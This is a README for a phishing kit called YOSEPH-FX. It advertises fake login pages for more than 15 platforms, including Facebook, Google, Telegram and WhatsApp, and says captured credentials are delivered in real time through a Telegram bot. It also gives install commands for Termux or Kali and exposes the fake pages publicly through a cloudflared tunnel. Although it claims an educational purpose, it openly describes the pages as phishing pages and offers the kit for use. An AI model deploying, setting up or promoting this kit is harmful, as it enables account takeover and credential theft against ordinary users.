# ⚡ YOSEPH-FX v3.0 (Official)
**YOSEPH-FX** is a professional Multi-Platform Login Tool designed for educational purposes and security testing. It features a Zphisher-style CLI menu and supports over 15+ popular social media platforms.

---

## 🚀 Features
* **15+ Target Platforms**: Includes Telegram, Facebook, Instagram, Google, TikTok, WhatsApp, and more.
* **ADVANCED_phisher-Style Menu**: Select your target platform directly from the Termux/Kali terminal.
* **Advanced Security**: Access control protected by Base64 obfuscated password.
* **Bot Integration**: Real-time data delivery via Telegram Bot API.
* **Modern UI**: Responsive and clean phishing pages built with Tailwind CSS.

---

## 🛠️ Installation & Setup

Follow these steps to install **YOSEPH-FX** on Termux or Kali Linux:

### 1. Update & Install Dependencies
```bash
apt update && apt upgrade -y
pkg install python git -y
pip install flask requests --break-system-packages
git clone [https://github.com/yosephalganeh-cloud/YOSEPH-FX.git](https://github.com/yosephalganeh-cloud/YOSEPH-FX.git)
cd YOSEPH-FX
python app.py
cloudflared tunnel --url [http://127.0.0.1:5000](http://127.0.0.1:5000)
